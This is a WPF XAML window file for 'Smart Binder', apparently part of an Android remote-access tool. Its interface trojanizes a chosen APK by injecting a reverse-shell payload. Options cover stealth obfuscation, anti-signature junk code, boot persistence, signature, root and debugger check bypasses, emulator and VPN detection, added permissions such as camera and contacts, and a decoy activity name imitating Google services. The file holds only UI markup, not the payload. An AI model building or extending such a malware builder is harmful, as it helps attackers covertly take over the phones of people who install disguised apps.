<Window x:Class="TcpServerApp.SmartBinderView"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
        mc:Ignorable="d"
        Title="Smart Binder - الدمج الذكي"
        Height="840" Width="980"
        Background="#0A0A0F"
        WindowStartupLocation="CenterScreen"
        WindowStyle="None"
        AllowsTransparency="True"
        ResizeMode="CanResize"
        FlowDirection="RightToLeft">

    <Window.Resources>

        <!-- ═══ SHARED COLORS (متوافقة مع MainWindow) ═══ -->
        <SolidColorBrush x:Key="AccentBlue"    Color="#2979FF"/>
        <SolidColorBrush x:Key="AccentCyan"    Color="#00E5FF"/>
        <SolidColorBrush x:Key="AccentGreen"   Color="#00E676"/>
        <SolidColorBrush x:Key="AccentOrange"  Color="#FF9100"/>
        <SolidColorBrush x:Key="AccentPurple"  Color="#AA00FF"/>
        <SolidColorBrush x:Key="AccentRed"     Color="#FF1744"/>
        <SolidColorBrush x:Key="Surface1"      Color="#12121A"/>
        <SolidColorBrush x:Key="Surface2"      Color="#1A1A28"/>
        <SolidColorBrush x:Key="Surface3"      Color="#22223A"/>
        <SolidColorBrush x:Key="TextPrimary"   Color="#F0F0FF"/>
        <SolidColorBrush x:Key="TextSecondary" Color="#8888AA"/>

        <!-- ═══ MODERN BUTTON ═══ -->
        <Style x:Key="ModernButton" TargetType="Button">
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Padding" Value="18,10"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="RenderTransformOrigin" Value="0.5,0.5"/>
            <Setter Property="RenderTransform">
                <Setter.Value><ScaleTransform ScaleX="1" ScaleY="1"/></Setter.Value>
            </Setter>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="bd" Background="{TemplateBinding Background}"
                                CornerRadius="10" Padding="{TemplateBinding Padding}">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="bd" Property="Opacity" Value="0.85"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter Property="RenderTransform">
                                    <Setter.Value><ScaleTransform ScaleX="0.96" ScaleY="0.96"/></Setter.Value>
                                </Setter>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="False">
                                <Setter TargetName="bd" Property="Opacity" Value="0.35"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- ═══ ICON BUTTON (TitleBar) ═══ -->
        <Style x:Key="IconButton" TargetType="Button">
            <Setter Property="Background" Value="Transparent"/>
            <Setter Property="Foreground" Value="#CCCCEE"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Width" Value="38"/>
            <Setter Property="Height" Value="38"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="FontSize" Value="16"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="bd" Background="Transparent" CornerRadius="8">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="bd" Property="Background" Value="#20FFFFFF"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter TargetName="bd" Property="Background" Value="#35FFFFFF"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- ═══ CLOSE BUTTON ═══ -->
        <Style x:Key="CloseButton" TargetType="Button" BasedOn="{StaticResource IconButton}">
            <Setter Property="Foreground" Value="#FF6B6B"/>
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Background" Value="#40FF1744"/>
                </Trigger>
            </Style.Triggers>
        </Style>

        <!-- ═══ MODERN TEXTBOX ═══ -->
        <Style x:Key="ModernTextBox" TargetType="TextBox">
            <Setter Property="Background" Value="#1A1A28"/>
            <Setter Property="Foreground" Value="#F0F0FF"/>
            <Setter Property="BorderBrush" Value="#2979FF"/>
            <Setter Property="BorderThickness" Value="1.5"/>
            <Setter Property="Padding" Value="10,8"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="CaretBrush" Value="#2979FF"/>
            <Setter Property="SelectionBrush" Value="#402979FF"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="TextBox">
                        <Border Background="{TemplateBinding Background}"
                                BorderBrush="{TemplateBinding BorderBrush}"
                                BorderThickness="{TemplateBinding BorderThickness}"
                                CornerRadius="8">
                            <ScrollViewer x:Name="PART_ContentHost" Margin="{TemplateBinding Padding}"/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="IsFocused" Value="True">
                    <Setter Property="BorderBrush" Value="#00E5FF"/>
                </Trigger>
            </Style.Triggers>
        </Style>

        <!-- ═══ CARD BORDER ═══ -->
        <Style x:Key="CardStyle" TargetType="Border">
            <Setter Property="Background" Value="#12121A"/>
            <Setter Property="CornerRadius" Value="14"/>
            <Setter Property="Padding" Value="20"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="BorderBrush" Value="#25253A"/>
            <Setter Property="Effect">
                <Setter.Value>
                    <DropShadowEffect Color="#000000" BlurRadius="24" ShadowDepth="4" Opacity="0.5"/>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- ═══ SECTION CARD ═══ -->
        <Style x:Key="SectionCard" TargetType="Border">
            <Setter Property="Background" Value="#1A1A28"/>
            <Setter Property="CornerRadius" Value="10"/>
            <Setter Property="Padding" Value="16"/>
            <Setter Property="Margin" Value="0,0,0,10"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="BorderBrush" Value="#25253A"/>
        </Style>

        <!-- ═══ LABEL STYLE ═══ -->
        <Style x:Key="SectionLabel" TargetType="TextBlock">
            <Setter Property="Foreground" Value="#8888AA"/>
            <Setter Property="FontSize" Value="11"/>
            <Setter Property="FontWeight" Value="Bold"/>
            <Setter Property="Margin" Value="0,0,0,8"/>
        </Style>

        <!-- ═══ MODERN COMBOBOX ═══ -->
        <Style x:Key="ModernComboBox" TargetType="ComboBox">
            <Setter Property="Background" Value="#1A1A28"/>
            <Setter Property="Foreground" Value="#F0F0FF"/>
            <Setter Property="BorderBrush" Value="#2979FF"/>
            <Setter Property="BorderThickness" Value="1.5"/>
            <Setter Property="Padding" Value="10,8"/>
            <Setter Property="FontSize" Value="12"/>
        </Style>

        <!-- ═══ MODERN CHECKBOX ═══ -->
        <Style x:Key="ModernCheckBox" TargetType="CheckBox">
            <Setter Property="Foreground" Value="#CCCCEE"/>
            <Setter Property="Margin" Value="0,5"/>
            <Setter Property="FontSize" Value="12"/>
        </Style>

        <!-- ═══ EXPANDER STYLE ═══ -->
        <Style x:Key="ModernExpander" TargetType="Expander">
            <Setter Property="Foreground" Value="#CCCCEE"/>
            <Setter Property="Margin" Value="0,0,0,6"/>
            <Setter Property="FontSize" Value="12"/>
        </Style>

    </Window.Resources>

    <!-- Root Container -->
    <Border Background="#0A0A0F" CornerRadius="14">
        <Border.Effect>
            <DropShadowEffect Color="Black" BlurRadius="40" ShadowDepth="0" Opacity="0.9"/>
        </Border.Effect>

        <Grid>
            <Grid.RowDefinitions>
                <RowDefinition Height="54"/>   <!-- TitleBar -->
                <RowDefinition Height="*"/>    <!-- Content -->
            </Grid.RowDefinitions>

            <!-- ═══════════════════════════════════════════
                 TITLE BAR
                 ═══════════════════════════════════════════ -->
            <Border Grid.Row="0" CornerRadius="14,14,0,0"
                    MouseLeftButtonDown="TitleBar_MouseLeftButtonDown">
                <Border.Background>
                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                        <GradientStop Color="#0A2010" Offset="0"/>
                        <GradientStop Color="#061A0C" Offset="0.5"/>
                        <GradientStop Color="#031008" Offset="1"/>
                    </LinearGradientBrush>
                </Border.Background>

                <Grid Margin="16,0,8,0">
                    <!-- LEFT: Logo + Title -->
                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                        <Grid Width="34" Height="34" Margin="0,0,10,0">
                            <Ellipse Width="34" Height="34">
                                <Ellipse.Fill>
                                    <RadialGradientBrush>
                                        <GradientStop Color="#00C853" Offset="0"/>
                                        <GradientStop Color="#00E676" Offset="1"/>
                                    </RadialGradientBrush>
                                </Ellipse.Fill>
                                <Ellipse.Effect>
                                    <DropShadowEffect Color="#00C853" BlurRadius="16" ShadowDepth="0" Opacity="0.7"/>
                                </Ellipse.Effect>
                            </Ellipse>
                            <TextBlock Text="📦" FontSize="16"
                                       HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Grid>

                        <TextBlock Text="Smart Binder" Foreground="#F0F0FF"
                                   FontSize="20" FontWeight="Bold" VerticalAlignment="Center">
                            <TextBlock.Effect>
                                <DropShadowEffect Color="#00C853" BlurRadius="10" ShadowDepth="0" Opacity="0.5"/>
                            </TextBlock.Effect>
                        </TextBlock>

                        <Border Background="#1500C853" CornerRadius="10" Padding="8,3" Margin="12,0,0,0"
                                BorderBrush="#3000C853" BorderThickness="1">
                            <TextBlock Text="الدمج الذكي المتقدم" Foreground="#88FFAA"
                                       FontSize="10" FontWeight="SemiBold"/>
                        </Border>

                        <!-- Server Sync Status Badge -->
                        <Border x:Name="bdrSyncBadge" Background="#15FFAA00" CornerRadius="10" Padding="10,3" Margin="10,0,0,0"
                                BorderBrush="#30FFAA00" BorderThickness="1" Visibility="Collapsed">
                            <StackPanel Orientation="Horizontal">
                                <Ellipse Width="7" Height="7" Margin="0,0,5,0" VerticalAlignment="Center">
                                    <Ellipse.Fill>
                                        <RadialGradientBrush>
                                            <GradientStop Color="#FFAA00" Offset="0"/>
                                            <GradientStop Color="#FF6500" Offset="1"/>
                                        </RadialGradientBrush>
                                    </Ellipse.Fill>
                                </Ellipse>
                                <TextBlock x:Name="txtSyncBadge" Text="مزامن مع الخادم" Foreground="#FFCC44"
                                           FontSize="10" FontWeight="SemiBold" VerticalAlignment="Center"/>
                            </StackPanel>
                        </Border>
                    </StackPanel>

                    <!-- RIGHT: Window Controls -->
                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Center">
                        <Button Content="─" Style="{StaticResource IconButton}" Click="Minimize_Click"/>
                        <Button Content="□" Style="{StaticResource IconButton}" Click="Maximize_Click"/>
                        <Button Content="✕" Style="{StaticResource CloseButton}" Click="Close_Click"/>
                    </StackPanel>
                </Grid>
            </Border>

            <!-- ═══════════════════════════════════════════
                 MAIN CONTENT
                 ═══════════════════════════════════════════ -->
            <Border Grid.Row="1" Style="{StaticResource CardStyle}" Margin="12,10,12,12">
                <Grid>
                    <Grid.RowDefinitions>
                        <RowDefinition Height="*"/>
                        <RowDefinition Height="Auto"/>
                    </Grid.RowDefinitions>

                    <!-- Scrollable Content -->
                    <ScrollViewer Grid.Row="0"
                                  HorizontalScrollBarVisibility="Disabled"
                                  VerticalScrollBarVisibility="Auto"
                                  Padding="0,0,8,0">
                        <StackPanel Margin="0,4,0,12">

                            <!-- ── SECTION 1: Target APK ── -->
                            <Border Style="{StaticResource SectionCard}" BorderBrush="#1A2979FF">
                                <Grid>
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="Auto"/>
                                        <ColumnDefinition Width="*"/>
                                    </Grid.ColumnDefinitions>

                                    <!-- App Icon -->
                                    <Border x:Name="brdTargetIcon" Grid.Column="0"
                                            Background="#12121A" Width="64" Height="64"
                                            CornerRadius="10" BorderBrush="#25253A" BorderThickness="1"
                                            Margin="0,0,16,0" Visibility="Collapsed">
                                        <Image x:Name="imgTargetIcon" Stretch="Uniform" Margin="6"/>
                                    </Border>

                                    <StackPanel Grid.Column="1">
                                        <TextBlock Style="{StaticResource SectionLabel}">
                                            <Run Text="1.  "/>
                                            <Run Text="📱" FontSize="12"/>
                                            <Run Text="  التطبيق الهدف (Target APK)"/>
                                        </TextBlock>
                                        <DockPanel>
                                            <Button Content="تصفح" Width="88"
                                                    Margin="10,0,0,0"
                                                    Style="{StaticResource ModernButton}"
                                                    Padding="10,7" FontSize="12"
                                                    Click="BtnBrowseTarget_Click">
                                                <Button.Background>
                                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                                                        <GradientStop Color="#2979FF" Offset="0"/>
                                                        <GradientStop Color="#0050D0" Offset="1"/>
                                                    </LinearGradientBrush>
                                                </Button.Background>
                                            </Button>
                                            <TextBox x:Name="txtTargetApk"
                                                     IsReadOnly="True"
                                                     Style="{StaticResource ModernTextBox}"/>
                                        </DockPanel>
                                    </StackPanel>
                                </Grid>
                            </Border>

                            <!-- ── SECTION 2: Payload ── -->
                            <Border Style="{StaticResource SectionCard}" BorderBrush="#1A00C853">
                                <StackPanel>
                                    <TextBlock Style="{StaticResource SectionLabel}">
                                        <Run Text="2.  "/>
                                        <Run Text="⚡" FontSize="12"/>
                                        <Run Text="  الحمولة (Payload)"/>
                                    </TextBlock>

                                    <!-- Radio: Generate -->
                                    <RadioButton x:Name="rbGenerate"
                                                 Content="توليد حمولة جديدة (Reverse Shell)"
                                                 IsChecked="True"
                                                 Foreground="#F0F0FF"
                                                 Margin="0,0,0,10"
                                                 Checked="RbPayload_Checked"/>

                                    <Border x:Name="pnlGeneratePayload"
                                            Background="#12121A" CornerRadius="10"
                                            Padding="14" Margin="0,0,0,10"
                                            BorderBrush="#1A2979FF" BorderThickness="1">
                                        <StackPanel>

                                            <!-- Server Sync Banner -->
                                            <Border x:Name="bdrServerSyncBanner"
                                                    Background="#1500E676" CornerRadius="8"
                                                    Padding="12,8" Margin="0,0,0,12"
                                                    BorderBrush="#2500E676" BorderThickness="1"
                                                    Visibility="Collapsed">
                                                <StackPanel Orientation="Horizontal">
                                                    <TextBlock Text="🔗" FontSize="14" Margin="0,0,8,0" VerticalAlignment="Center"/>
                                                    <StackPanel>
                                                        <TextBlock Text="تم مزامنة الإعدادات من الخادم النشط"
                                                                   Foreground="#00E676" FontSize="11" FontWeight="Bold"/>
                                                        <TextBlock x:Name="txtServerSyncInfo"
                                                                   Foreground="#668877" FontSize="10" Margin="0,2,0,0"/>
                                                    </StackPanel>
                                                </StackPanel>
                                            </Border>

                                            <!-- Host / Port / Key -->
                                            <Grid Margin="0,0,0,12">
                                                <Grid.ColumnDefinitions>
                                                    <ColumnDefinition Width="2*"/>
                                                    <ColumnDefinition Width="8"/>
                                                    <ColumnDefinition Width="*"/>
                                                    <ColumnDefinition Width="8"/>
                                                    <ColumnDefinition Width="*"/>
                                                </Grid.ColumnDefinitions>

                                                <StackPanel Grid.Column="0">
                                                    <TextBlock Text="🌐  Host (IP / No-IP)" Style="{StaticResource SectionLabel}"/>
                                                    <TextBox x:Name="txtHost"
                                                             Text="127.0.0.1"
                                                             Style="{StaticResource ModernTextBox}"/>
                                                </StackPanel>

                                                <StackPanel Grid.Column="2">
                                                    <TextBlock Text="🔌  Port" Style="{StaticResource SectionLabel}"/>
                                                    <TextBox x:Name="txtPort"
                                                             Text="4444"
                                                             Style="{StaticResource ModernTextBox}"/>
                                                </StackPanel>

                                                <StackPanel Grid.Column="4">
                                                    <TextBlock Text="🔐  Connection Key" Style="{StaticResource SectionLabel}"/>
                                                    <TextBox x:Name="txtKey"
                                                             Text=""
                                                             Style="{StaticResource ModernTextBox}"/>
                                                </StackPanel>
                                            </Grid>

                                            <!-- Injection Features -->
                                            <TextBlock Text="🛡️  ميزات الحقن الذكي (Injection Features)"
                                                       Style="{StaticResource SectionLabel}"/>
                                            <UniformGrid Columns="2">
                                                <CheckBox x:Name="chkObfuscate"
                                                          Content="Stealth Obfuscation"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkJunkCode"
                                                          Content="Inject Junk Code (Anti-Sig)"
                                                          IsChecked="True"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkResilience"
                                                          Content="Payload Resilience (Watchdog)"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkHiddenApi"
                                                          Content="Hidden API Bridge (Reflection)"
                                                          IsChecked="True"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                            </UniformGrid>
                                        </StackPanel>
                                    </Border>

                                    <!-- Radio: Select existing -->
                                    <RadioButton x:Name="rbSelect"
                                                 Content="اختيار ملف DEX/APK موجود"
                                                 Foreground="#F0F0FF"
                                                 Margin="0,0,0,8"
                                                 Checked="RbPayload_Checked"/>
                                    <DockPanel x:Name="pnlSelectPayload" Visibility="Collapsed">
                                        <Button Content="تصفح" Width="88"
                                                Style="{StaticResource ModernButton}"
                                                Padding="10,7" FontSize="12"
                                                Margin="10,0,0,0"
                                                Click="BtnBrowsePayload_Click">
                                            <Button.Background>
                                                <SolidColorBrush Color="#22223A"/>
                                            </Button.Background>
                                        </Button>
                                        <TextBox x:Name="txtPayloadPath"
                                                 IsReadOnly="True"
                                                 Style="{StaticResource ModernTextBox}"/>
                                    </DockPanel>
                                </StackPanel>
                            </Border>

                            <!-- ── SECTION 3: Injection Method ── -->
                            <Border Style="{StaticResource SectionCard}" BorderBrush="#1AFF9100">
                                <StackPanel>
                                    <TextBlock Style="{StaticResource SectionLabel}">
                                        <Run Text="3.  "/>
                                        <Run Text="💉" FontSize="12"/>
                                        <Run Text="  خيارات الحقن (Injection Method)"/>
                                    </TextBlock>
                                    <ComboBox SelectedIndex="0"
                                              Style="{StaticResource ModernComboBox}"
                                              Margin="0,0,0,10">
                                        <ComboBoxItem Content="Multidex Injection (Recommended) — حقن متقدم"/>
                                        <ComboBoxItem Content="Smali Hook (Main Activity) — حقن في النشاط الرئيسي"/>
                                    </ComboBox>
                                    <CheckBox x:Name="chkPersistence"
                                              Content="تفعيل الثبات — Inject Persistence / BootReceiver"
                                              Style="{StaticResource ModernCheckBox}"/>
                                </StackPanel>
                            </Border>

                            <!-- ── SECTION 4: App Identity ── -->
                            <Border Style="{StaticResource SectionCard}" BorderBrush="#1AAA00FF">
                                <StackPanel>
                                    <TextBlock Style="{StaticResource SectionLabel}">
                                        <Run Text="4.  "/>
                                        <Run Text="🏷️" FontSize="12"/>
                                        <Run Text="  هوية التطبيق (App Identity — اختياري)"/>
                                    </TextBlock>
                                    <Grid>
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width="*"/>
                                            <ColumnDefinition Width="12"/>
                                            <ColumnDefinition Width="*"/>
                                        </Grid.ColumnDefinitions>
                                        <StackPanel Grid.Column="0">
                                            <TextBlock Text="App Name" Style="{StaticResource SectionLabel}"/>
                                            <TextBox x:Name="txtAppName" Style="{StaticResource ModernTextBox}"/>
                                        </StackPanel>
                                        <StackPanel Grid.Column="2">
                                            <TextBlock Text="Package Name" Style="{StaticResource SectionLabel}"/>
                                            <TextBox x:Name="txtPackageName" Style="{StaticResource ModernTextBox}"/>
                                        </StackPanel>
                                    </Grid>
                                </StackPanel>
                            </Border>

                            <!-- ── SECTION 5: Expert Binding Options ── -->
                            <Border Style="{StaticResource SectionCard}" BorderBrush="#1A00E5FF">
                                <StackPanel>
                                    <TextBlock Style="{StaticResource SectionLabel}">
                                        <Run Text="⚙️" FontSize="12"/>
                                        <Run Text="  إعدادات دمج خبيرة (Expert Binding Options)"/>
                                    </TextBlock>

                                    <Expander Header="🛡️  تخطي الحماية (Security Bypass)"
                                              Style="{StaticResource ModernExpander}">
                                        <Border Background="#12121A" CornerRadius="8" Padding="12,8" Margin="0,4,0,0">
                                            <StackPanel>
                                                <CheckBox x:Name="chkSigBypass"
                                                          Content="تخطي فحص التوقيع (Signature Bypass)"
                                                          IsChecked="True"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkRootBypass"
                                                          Content="تخطي فحص الروت (Root Detection Bypass)"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkDebugBypass"
                                                          Content="تخطي فحص التصحيح (Anti-Debug Bypass)"
                                                          IsChecked="True"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                            </StackPanel>
                                        </Border>
                                    </Expander>

                                    <Expander Header="🔍  كشف البيئة (Environment Detection)"
                                              Style="{StaticResource ModernExpander}">
                                        <Border Background="#12121A" CornerRadius="8" Padding="12,8" Margin="0,4,0,0">
                                            <StackPanel>
                                                <CheckBox x:Name="chkEmuDetect"
                                                          Content="كشف المحاكيات (Emulator Detection)"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkVpnDetect"
                                                          Content="كشف VPN/Proxy (VPN Detection)"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkInstallerDetect"
                                                          Content="كشف مصدر التثبيت (Store Check)"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                            </StackPanel>
                                        </Border>
                                    </Expander>

                                    <Expander Header="📦  معالجة الموارد (Resource Processing)"
                                              Style="{StaticResource ModernExpander}">
                                        <Border Background="#12121A" CornerRadius="8" Padding="12,8" Margin="0,4,0,0">
                                            <StackPanel>
                                                <CheckBox x:Name="chkManifestObf"
                                                          Content="تموية المانيفست (Manifest Obfuscation)"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <CheckBox x:Name="chkResourceShrink"
                                                          Content="تقليص الموارد (Resource Shrinking)"
                                                          IsChecked="True"
                                                          Style="{StaticResource ModernCheckBox}"/>
                                                <TextBlock Text="اسم النشاط الرئيسي المموه"
                                                           Foreground="#555577" FontSize="10" Margin="0,8,0,4"/>
                                                <TextBox x:Name="txtFakeActivity"
                                                         Text="com.google.android.gms.auth.Activity"
                                                         Style="{StaticResource ModernTextBox}"
                                                         FontSize="11"/>
                                            </StackPanel>
                                        </Border>
                                    </Expander>
                                </StackPanel>
                            </Border>

                            <!-- ── SECTION 6: Extra Permissions ── -->
                            <Border Style="{StaticResource SectionCard}" BorderBrush="#1AFF1744">
                                <StackPanel>
                                    <TextBlock Style="{StaticResource SectionLabel}">
                                        <Run Text="5.  "/>
                                        <Run Text="🔑" FontSize="12"/>
                                        <Run Text="  صلاحيات إضافية (Extra Permissions — اختياري)"/>
                                    </TextBlock>
                                    <RadioButton x:Name="rbDefaultPerms"
                                                 Content="استخدام صلاحيات التطبيق الافتراضية"
                                                 IsChecked="True"
                                                 Foreground="#F0F0FF"
                                                 Margin="0,0,0,6"
                                                 Checked="RbPerms_Checked"/>
                                    <RadioButton x:Name="rbSpecifyPerms"
                                                 Content="تحديد صلاحيات إضافية يدوياً"
                                                 Foreground="#F0F0FF"
                                                 Margin="0,0,0,8"
                                                 Checked="RbPerms_Checked"/>
                                    <TextBox x:Name="txtExtraPerms"
                                             Visibility="Collapsed"
                                             Style="{StaticResource ModernTextBox}"
                                             MinHeight="70"
                                             TextWrapping="Wrap"
                                             AcceptsReturn="True"
                                             ToolTip="أدخل الصلاحيات مفصولة بفاصلة أو سطر جديد (مثال: CAMERA, READ_CONTACTS)"/>
                                </StackPanel>
                            </Border>

                        </StackPanel>
                    </ScrollViewer>

                    <!-- ── BOTTOM ACTION BAR ── -->
                    <Border Grid.Row="1"
                            Background="#12121A" CornerRadius="10"
                            Padding="16,12" Margin="0,6,0,0"
                            BorderBrush="#25253A" BorderThickness="1">
                        <Grid>
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="*"/>
                                <ColumnDefinition Width="Auto"/>
                            </Grid.ColumnDefinitions>

                            <!-- Status + Server Info -->
                            <StackPanel Grid.Column="0" VerticalAlignment="Center">
                                <TextBlock x:Name="txtStatus"
                                           Text="⏳  بانتظار الإدخال..."
                                           Foreground="#8888AA"
                                           FontSize="13"/>
                                <TextBlock x:Name="txtServerInfo"
                                           Text=""
                                           Foreground="#445544"
                                           FontSize="10"
                                           Margin="0,3,0,0"
                                           Visibility="Collapsed"/>
                            </StackPanel>

                            <!-- Action Button -->
                            <Button Grid.Column="1"
                                    Content="🚀  بدء عملية الدمج"
                                    Height="44" Padding="24,0"
                                    Style="{StaticResource ModernButton}"
                                    FontSize="14"
                                    Click="BtnBind_Click">
                                <Button.Background>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                                        <GradientStop Color="#00C853" Offset="0"/>
                                        <GradientStop Color="#00896B" Offset="1"/>
                                    </LinearGradientBrush>
                                </Button.Background>
                            </Button>
                        </Grid>
                    </Border>

                </Grid>
            </Border>

        </Grid>
    </Border>
</Window>
